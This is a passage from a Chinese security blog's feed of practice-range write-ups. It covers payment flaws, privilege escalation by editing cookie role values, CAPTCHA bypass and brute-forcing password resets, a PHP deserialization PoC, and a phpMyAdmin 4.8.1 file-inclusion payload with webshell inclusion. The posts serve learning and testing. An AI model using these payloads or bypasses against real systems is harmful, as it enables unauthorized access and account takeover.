alt="img"></strong> </p><p><strong>那么我们该如何利用，看看有没有地方可以上传，找到头像上传，然后上传图片马</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/7c3832f601c433283f4574388486c6b3.png" alt="img"></strong> </p><p><strong>然后包含这个文件就行</strong></p><p><strong><img src="https://www.zkaq.org/upload/userfile/131/ce7be7acc1d677eb1b6822f92aff0df9.png" alt="img"></strong> </p><p><strong>0x03总结</strong>  </p><p><strong>其实该CMS所存在的漏洞不仅仅只有这些，我文章中的这些也只是一个抛砖引玉，只是说出一个更适合代码基础薄弱的同学进行代码审计的方法，如果我文章中有什么写的可以再改进的地方，可以随时联系我！谢谢大家花费了时间来读在下的粗鄙小文，谢谢大家</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 0day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>支付漏洞</title>
      <link href="/2019/05/28/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/28/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index> </excerpt></p><ul><li><a id="more"></a><the rest of contents文></the></li></ul><p>支付漏洞一直以来就是是高风险，对企业来说危害很大，对用户来说同样危害也大。就比如我用他人账户进行消费，这也属于支付漏洞中的越权问题。那么支付漏洞一般存在在哪些方面呢，根据名字就知道，凡是涉及购买、资金等方面的功能处就有可能存在支付问题</p><p>修改支付价格,修改支付状态,修改购买数量,修改附属值,修改支付接口,多重替换支付,重复支付,最小额支付,值为最大值支付问题,越权支付,无限制试用,修改优惠价,多线程并发问题(不常见),快捷支付原理,浏览器跳转,服务器端异步通知</p><p>如何挖掘:</p><p>找打关键的数据包,分析数据包,不按套路出牌,pc端尝试过，wap端也看看，app也试试</p><p>靶场(<a href="https://hack.zkaq.org/?a=battle" target="_blank" rel="noopener">掌控者</a>)看下题目:</p><p>找到靶场先注册。。买东西。。。改参数。。。OK</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/支付01.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/支付02.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/支付03.png" alt="躲起来了"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平行越权、垂直越权</title>
      <link href="/2019/05/27/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
      <url>/2019/05/27/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="什么是越权？"><a href="#什么是越权？" class="headerlink" title="什么是越权？**"></a>什么是越权？**</h1><p><strong>越权漏洞是一种很常见的逻辑安全漏洞。是由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞。</strong></p><h1 id="越权测试过程"><a href="#越权测试过程" class="headerlink" title="越权测试过程"></a><strong>越权测试过程</strong></h1><p><strong>登陆A用户是，正常更改查看A用户信息，然后抓取数据包，将传参ID修改伟其他用户，如果成功查看或者修改了同权限其他用户信息就属于水平越权。（如果可以影响到高权限用户就是垂直越权）</strong></p><p><strong>传参ID参数需要自己检测（常见：uid=  id=  user= 等）通常使用burp进行传参（传参可能在GEI POST COOKIE）</strong></p><p><strong>常见平行越权（不需要输入原密码的修改密码，抓包改用户或者用户名id修改他人密码<br>修改资料的时候修改id<br>查看订单的时候，遍历订单id<br>等）</strong></p><h1 id="常见越权漏洞"><a href="#常见越权漏洞" class="headerlink" title="常见越权漏洞"></a><strong>常见越权漏洞</strong></h1><ul><li><strong>水平越权：两个不同的公司A和B，通过修改请求，公司A可以任意修改B公司的员工、部门、考勤等信息</strong></li><li><strong>垂直越权：同一个公司不同权限的管理员A和B，通过修改请求，管理员A可以修改不在他管辖范围内的员工的部门、考勤、工资等信息</strong></li></ul><h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a><strong><a href="https://hack.zkaq.org" target="_blank" rel="noopener">靶场实战</a></strong></h1><p><strong>这里采用<a href="https://hack.zkaq.org" target="_blank" rel="noopener">掌控者</a>的靶场，</strong></p><p><strong>首先注册</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/越权01.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/越权02.png" alt="躲起来了"></strong></p><p><strong>刷新后抓包发现</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/越权03.png" alt="躲起来了"></strong></p><p><strong>将shenfen=2&amp;UserID=10&amp;admin=0改成shenfen=1&amp;UserID=10&amp;admin=1后再发包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: safedog-flow-item=754DC0A8ECE57414864DFFC7FDF7E05A; ASPSESSIONIDQSTCCASA=IEIFAKLAKDEJIFJNOMKEOEEA; BWSsoft%5F2010=realname=qwer&amp;dlcs=4&amp;username=qwer&amp;wxqy=&amp;bumen=qwer&amp;loginname=qwer&amp;danwei=qwer&amp;shenfen=2&amp;UserID=10&amp;admin=0&amp;wxlb=&amp;phone=qwerqwer&amp;CookieDate=; ASPSESSIONIDQQRDDATA=CHNJCCMADBDIIJJBJLJBHLDI</span><br></pre></td></tr></table></figure><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/越权04.png" alt="躲起来了"></strong></p><p><strong>发现出现了“后台管理”于是点进去发现了这道题的FLAG</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/越权05.png" alt="躲起来了"></strong></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>验证码绕过、密码找回漏洞</title>
      <link href="/2019/05/27/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/27/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="验证码作用"><a href="#验证码作用" class="headerlink" title="验证码作用"></a><strong>验证码作用</strong></h1><p><strong>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA" target="_blank" rel="noopener">计算机</a>和人类的<a href="https://baike.baidu.com/item/%E5%9B%BE%E7%81%B5%E6%B5%8B%E8%AF%95" target="_blank" rel="noopener">图灵测试</a>）的缩写，是一种区分用户是计算机还是人的公共全自动<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/71525" target="_blank" rel="noopener">程序</a>。</strong></p><p><strong>可以防止：恶意破解密码、<a href="https://baike.baidu.com/item/%E5%88%B7%E7%A5%A8/6540942" target="_blank" rel="noopener">刷票</a>、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。</strong></p><p><strong>这个问题可以由计算机生成并评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</strong></p><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a><strong>分类：</strong></h2><ul><li><h5 id="Gif动画验证码"><a href="#Gif动画验证码" class="headerlink" title="Gif动画验证码"></a><strong>Gif动画验证码</strong></h5></li><li><h5 id="手机短信验证码"><a href="#手机短信验证码" class="headerlink" title="手机短信验证码"></a><strong>手机短信验证码</strong></h5></li><li><h5 id="手机语音验证码"><a href="#手机语音验证码" class="headerlink" title="手机语音验证码"></a><strong>手机语音验证码</strong></h5></li><li><h5 id="视频验证码"><a href="#视频验证码" class="headerlink" title="视频验证码"></a><strong>视频验证码</strong></h5></li></ul><h1 id="验证码绕过的常见姿势"><a href="#验证码绕过的常见姿势" class="headerlink" title="验证码绕过的常见姿势"></a><strong>验证码绕过的常见姿势</strong></h1><h3 id="1-验证码不刷新"><a href="#1-验证码不刷新" class="headerlink" title="1. 验证码不刷新"></a><strong>1. 验证码不刷新</strong></h3><p>　　<strong>导致验证码不刷新的原因是：登录密码错误之后，session中的值没有更新，验证码不变。验证码不刷新通常有以下两种情况：无条件不刷新、有条件不刷新。</strong></p><h4 id="1-1无条件不刷新"><a href="#1-1无条件不刷新" class="headerlink" title="　　1.1无条件不刷新"></a>　　<strong>1.1无条件不刷新</strong></h4><p>　　<strong>无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解。</strong></p><h4 id="1-2有条件不刷新"><a href="#1-2有条件不刷新" class="headerlink" title="　　1.2有条件不刷新"></a>　　<strong>1.2有条件不刷新</strong></h4><p>　　<strong>有条件不刷新多见于如下情况：登录失败之后，系统会打开一个新页面或者弹出一个新的警告窗口，提示用户登录失败，点击确定后返回登录界面且验证码刷新。这种情况下，只要我们不关闭新窗口或弹窗，配合使用Burpsuite的intruder模块就可以进行暴力破解了。</strong></p><h3 id="2-验证码前端可获取"><a href="#2-验证码前端可获取" class="headerlink" title="2.验证码前端可获取"></a><strong>2.验证码前端可获取</strong></h3><p>　　<strong>这种情况在早期的一些网站中比较常见，主要是因为程序员在写代码的时候安全意识不足导致的。验证码通常会被他们隐藏在网站的源码中或者高级一点的隐藏在请求的Cookie中，但这两种情况都可以被攻击者轻松绕过。</strong></p><h4 id="2-1验证码隐藏在源码中"><a href="#2-1验证码隐藏在源码中" class="headerlink" title="　　2.1验证码隐藏在源码中"></a>　　<strong>2.1验证码隐藏在源码中</strong></h4><p>　　<strong>验证这种情况很简单，我们只需要记住验证码，然后右键打开网站源代码，Ctrl+F搜索，输入刚才的验证码，如果可以成功匹配到，那恭喜你，接下来就可以写工具，提取源码中的验证码并将其放入每次请求的报文中，来进行帐号破解，这里推荐使用python。</strong></p><h4 id="2-2验证码隐藏在Cookie中"><a href="#2-2验证码隐藏在Cookie中" class="headerlink" title="　　2.2验证码隐藏在Cookie中"></a>　　<strong>2.2验证码隐藏在Cookie中</strong></h4><p>　　<strong>这种情况，我们可以在提交登录的时候抓包，然后分析一下包中的Cookie字段，看看其中有没有相匹配的验证码，或者是经过了一些简单加密后的验证码。</strong></p><h3 id="3-验证码空值绕过"><a href="#3-验证码空值绕过" class="headerlink" title="3. 验证码空值绕过"></a><strong>3. 验证码空值绕过</strong></h3><p>　　<strong>验证码空值绕过，是在日常的<a href="javascript:;" target="_blank" rel="noopener">渗透测试</a>中很容易被我们忽略的一点，实际应用中我们可以通过直接删除验证码参数或者Cookie中的一些值来绕过判断，进行暴力破解。</strong></p><h3 id="4-验证码易识别"><a href="#4-验证码易识别" class="headerlink" title="4. 验证码易识别"></a><strong>4. 验证码易识别</strong></h3><p>　　<strong>在平常的漏洞挖掘过程中，如果我们发现登录的验证码非常简单且易于识别，那我们就可以尝试使用自动化工具来进行登录破解了，如PKAV的HTTP Fuzzer。</strong></p><h3 id="5-存在无验证码页面"><a href="#5-存在无验证码页面" class="headerlink" title="5. 存在无验证码页面"></a><strong>5. 存在无验证码页面</strong></h3><p>　　<strong>经过测试，如果我们发现网站验证码自身并不存在缺陷，那我们接下来就可以尝试寻找一些其他的登录页面或接口来尝试暴力破解。</strong></p><h4 id="5-1隐藏的页面"><a href="#5-1隐藏的页面" class="headerlink" title="　　5.1隐藏的页面"></a>　　<strong>5.1隐藏的页面</strong></h4><p>　　<strong>这种页面通常是留给测试人员使用的，或者是一些忘记删除的老界面，利用的前提是该界面依旧可用，一般情况下，我们可以通过扫描器来发现这种页面。</strong></p><h4 id="5-2-微信公众号、APP登录页面"><a href="#5-2-微信公众号、APP登录页面" class="headerlink" title="　　5.2 微信公众号、APP登录页面"></a>　　<strong>5.2 微信公众号、APP登录页面</strong></h4><p>　　<strong>很多网站的<a href="javascript:;" target="_blank" rel="noopener">web</a>登录页面已经做的相当完善了，但是却在微信公众后的绑定接口或者是APP的登录界面上面栽了跟头，在渗透测试的过程中，一定不要忘了对公众号和APP的测试。</strong></p><h3 id="6-其他绕过方法"><a href="#6-其他绕过方法" class="headerlink" title="6. 其他绕过方法"></a><strong>6. 其他绕过方法</strong></h3><h4 id="6-1万能验证码"><a href="#6-1万能验证码" class="headerlink" title="　　6.1万能验证码"></a>　　<strong>6.1万能验证码</strong></h4><p>　　<strong>渗透测试的过程中，有时候会出现这种情况，系统存在一个万能验证码，如000000，只要输入万能验证码，就可以无视验证码进行暴力破解。</strong></p><h4 id="6-2验证码无效"><a href="#6-2验证码无效" class="headerlink" title="　　6.2验证码无效"></a>　　<strong>6.2验证码无效</strong></h4><p>　　<strong>这种情况下，无论我们输入什么数据，验证码都会判断通过，验证码形同虚设，这种情况我只遇到过一次。</strong></p><h4 id="6-3验证码数量有限"><a href="#6-3验证码数量有限" class="headerlink" title="　　6.3验证码数量有限"></a>　　<strong>6.3验证码数量有限</strong></h4><p>　　<strong>多见于计算类型的验证码，如1+8=？，这种类型的验证码严格意义上来说不能叫做验证码，多刷新几次验证码，我们可能会发现系统中的算数题目只有那么几道，这种情况下只要将验证码全部下载下来，生成一个md5库，然后将前端生成的验证码与本地文件进行对比即可。</strong></p><h1 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a><strong>密码找回漏洞</strong></h1><p><strong>有一类验证码，他并不是区分用户是计算机还是人类的公共全自动程序，他是用来证明你身份的，比如你登陆微信，支付宝，支持短信验证码登陆，想这类验证码他实际上是用来区分你的身份的。</strong></p><p><strong>当你QQ密码忘记密码的时候，你需要找回密码，然后他要求把APP显示的动态密码填入框里面，一般而言手机验证码时间都有5-30分钟，如果他没有做尝试限制的话，可以尝试进行穷举，然后直接跑出验证码就修改他人密码。</strong></p><p><strong>第一种就是找密码，往邮箱发明文密码的密码或者验证码（手机短信验证码就是往你手机号码发验证码）通过这样的方法来判断是否是本人</strong></p><p><strong>第二种发送一种重置密码的链接到邮箱</strong></p><p><strong>这样就可能出现一下几种漏洞</strong></p><ol><li><strong>验证码发送后的前端返回</strong></li><li><strong>验证码可控</strong></li><li><strong>直接修改密码页面</strong></li><li><strong>缺失的身份认证–&gt;绑定别人的账号到自己手机</strong></li><li><strong>越权漏洞–&gt;自己验证码通过改包然后修改他们密码</strong></li></ol><p><strong>这里利用掌控者靶场</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/验证码02.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/验证码03.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/验证码05.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/验证码04.png" alt="躲起来了"></strong></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 黑夜的柒佰 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unserialize反序列化漏洞</title>
      <link href="/2019/05/27/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/27/unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a><strong>什么是反序列化</strong></h1><p><strong><a href="http://www.runoob.com/php/php-serialize-function.html" target="_blank" rel="noopener">serialize()</a> 函数用于序列化对象或数组，并返回一个字符串。</strong></p><p><strong><a href="http://www.runoob.com/php/php-serialize-function.html" target="_blank" rel="noopener">serialize()</a> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</strong></p><p><strong>unserialize() 函数用于将通过 <a href="http://www.runoob.com/php/php-serialize-function.html" target="_blank" rel="noopener">serialize() </a>函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sites = array(&apos;Google&apos;, &apos;Runoob&apos;, &apos;Facebook&apos;);</span><br><span class="line">$serialized_data = serialize($sites);</span><br><span class="line">echo  $serialized_data . PHP_EOL;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>结果如下:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;</span><br></pre></td></tr></table></figure><p><strong>网图解释下:</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/序列化01.png" alt="躲起来了"></strong></p><h1 id="魔术方法和反序列化利用"><a href="#魔术方法和反序列化利用" class="headerlink" title="魔术方法和反序列化利用"></a><strong>魔术方法和反序列化利用</strong></h1><p><strong>其实本质上来说，serialize() 和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</strong></p><p><strong>当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</strong></p><p><strong>Magic Function：</strong></p><ul><li><strong>__construct()：当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。（构造函数）</strong></li><li><strong>__destruct()：当对象被销毁时会自动调用。（析构函数）</strong></li><li><strong>__wakeup()：unserialize() 时会自动调用。</strong></li></ul><h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a><strong>靶场实战</strong></h1><p><strong>这里在掌控者的靶场</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/序列化02.png" alt="躲起来了"></strong></p><p><strong>来分析下代码。首先看HTML的部分，其中会通过php的foreach循环来遍历$todos遍历的内容，并以无序列表的形式显示在页面上。</strong></p><p><strong>然后看一下表单处理的部分，首先获取textarea提交的文本，存储到数组变量 $todos 中，然后对 ​$todos 进行序列化并存入变量 $m中，</strong></p><p><strong>再对 $m进行md5加密，加密后的内容存到变量 ​$h中，最后将 $h和​$m拼接起来作为 Cookie todos的值，然后重定向到当前页面。</strong></p><p><strong>接着，获取Cookie中 todos的值，分别取出$h和 ​$m的值，比较两者是否相等，如果相等，则将$m的值进行反序列化，并将结果存到变量​$todos，最终在下面的foreach循环中显示在页面上。</strong></p><p><strong>再往上看，有一个叫 readme的类，该类中重写了魔术方法 __toString()，如果用echo 打印该类的对象，则内容就是Readme.txt 和 成员变量 $this-&gt;source 的内容的拼接。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;source&apos;]))&#123; </span><br><span class="line">    $s = new readme(); </span><br><span class="line">    $s-&gt;source = __FILE__; </span><br><span class="line">    echo $s; </span><br><span class="line">    exit; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>而且可以看到，成员变量可以控制。因此可以按照上面代码中对Cookie的处理逻辑，构造好包含着能反序列化为 readme 对象的字符串，然后放到Cookie中去访问靶场链接，就能将 flag.php的内容打印到页面上。</strong></p><p><strong>POC如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class readme&#123;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return highlight_file(&apos;Readme.txt&apos;, true).highlight_file($this-&gt;source, true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">if(isset($_GET[&apos;source&apos;]))&#123;</span><br><span class="line">$s = new readme();</span><br><span class="line">$s-&gt;source =&apos;flag.php&apos;; </span><br><span class="line">$s=[$s];</span><br><span class="line">echo md5(serialize($s)).serialize($s);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/序列化03.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/序列化04.jpg" alt="躲起来了"></strong></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 打字很累 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地包含与远程包含</title>
      <link href="/2019/05/27/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/"/>
      <url>/2019/05/27/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a><strong>函数解析</strong></h1><h4 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数:"></a><strong>常见函数:</strong></h4><ul><li><strong>php:include(),include_once(), require(),require_once(), fopen(),readfile()</strong></li><li><strong>Jsp/servlet: java.io.File(), java.io.FileReader()</strong></li><li><strong>asp: include file, include virtual</strong></li></ul><p><strong>通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。</strong></p><p><strong>include_once （require_once）语句在脚本执行期间包含并运行指定文件。此行为和 include （require）语句类似，区别是如果该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once（require_once）需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载。</strong></p><p><strong>了解下include、include_once、require和require_once这4个函数:</strong></p><ul><li><strong>require 会生成致命错误（E_COMPILE_ERROR）并停止脚本</strong></li><li><strong>include 只生成警告（E_WARNING），并且脚本会继续</strong></li><li><strong>include_once 函数：在脚本执行期间包含并运行指定文件。此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次</strong></li><li><strong>require_once 函数：和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含</strong></li></ul><h1 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a><strong>什么是文件包含</strong></h1><p><strong>攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件被当成脚本文件解析）</strong></p><p><strong>一句话说来说就是：文件包含并不属于漏洞，但是，由于对包含进来的我呢缉拿不可控，导致了文件包含漏洞的产生。</strong></p><p><strong>注：包含文件很有用，可以简化代码——文件包含分本地包含和远程包含（需要allow_url_include = On)—–本地文件包含LFI     远程文件包含RFI</strong></p><p><strong>由于开发人员编写源码时将可重复使用的代码写入到单个的文件中并在需要的时候将它们包含在特殊的功能代码文件中，这样被包含文件中的代码就会被解释执行。如果没有针对代码中存在文件包含的函数入口做过滤，就会导致客户端可以提交恶意构造语句提交，并交由服务器端解释执行。文件包含攻击可能存在于WEB服务器源码里的inlcude()此类文件包含操作函数附近，通过客户端构造提交文件路径，是该漏洞攻击成功的最主要原因。</strong></p><h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a><strong>靶场实战</strong></h1><p><strong>这种文件包含的漏洞大多是白盒测试，这里选择在phpMyadmin4.8.1中进行。</strong></p><p><strong>利用seay源代码审计系统</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/文件包含01.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/文件包含02.png" alt="躲起来了"></strong></p><p><strong>if区间一共有五个判断:</strong></p><p><strong>1、是否存在target参数</strong></p><p><strong>2、target参数是否为字符串</strong></p><p><strong>3、值不能以index开头值不能出现在$target_blacklist内</strong></p><p><strong>4、Core类的checkPageValidity方法判断</strong></p><p><strong>如果通过判断则包含参数所指定的文件。</strong></p><p><strong>前几个判断可以忽略，重要的是后面两个判断，先看第一个</strong></p><p><strong>/index.php</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/文件包含03.png" alt="躲起来了"></strong></p><p><strong>$target_blacklist中的数组为import.php 和 export.php，只要target的值不是这两个就可以</strong><br><strong>我们看下一个判断</strong><br><strong>首先找到Core类的checkPageValidity函数:</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/文件包含04.png" alt="躲起来了"></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">checkPageValidity函数里又是五个判断：</span><br><span class="line">$whitelist为空则引用静态声明的$goto_whitelist</span><br><span class="line">如果$page没有被定义过或者$page不为字符串则return false</span><br><span class="line">$page存在$whitelist中的某个值则返回true</span><br><span class="line">$_page存在$whitelist中的某个值则返回true</span><br><span class="line">经过urldecode函数解码后的$_page存在$whitelist中的某个值则返回true</span><br></pre></td></tr></table></figure><p><strong>逐行分析:</strong><br><strong>首先index.php调用checkPageValidity参数时并没有传第二个参数所以会进入此参数的第一个if区间，我们来看一下$goto_whilelist</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/文件包含05.png" alt="躲起来了"></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$goto_whilelist定义了些可以被包含的文件名(省略了一部分)第二个if直接跳过我们来看第三个if区间,如果$page如果等于$goto_whilelist的某个值则return真。</span><br><span class="line">  $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $_page为 以?分割然后取出前面的字符串再判断值是否存在与$goto_whilelist某个数组中。</span><br></pre></td></tr></table></figure><p><strong>这个判断的作用是，如果target值带有参数的情况下，phpmyadmin也能正确的包含文件。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后面又将$page参数用urlencode解码再进行以?分割取出前面的值做判断。那么传入target=db_sql.php%253f/../../test.php php内容为&lt;?php phpinfo();?&gt;//%253f是?号的二此url编码urlcode将$page解码后是db_sql.php?/../../test.php  再以?分割取出来前面的字符串为index.php，$whitelist中有index.php所以会进入最后一个if区间return true</span><br></pre></td></tr></table></figure><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/文件包含06.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/文件包含07.png" alt="躲起来了"></strong></p><p><strong>利用：还可以把WebShell写入到数据库中然后包含数据库文件，cookie文件等等，这里就不一一尝试了</strong></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 就很棒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖漏洞</title>
      <link href="/2019/05/23/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/23/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</url>
      
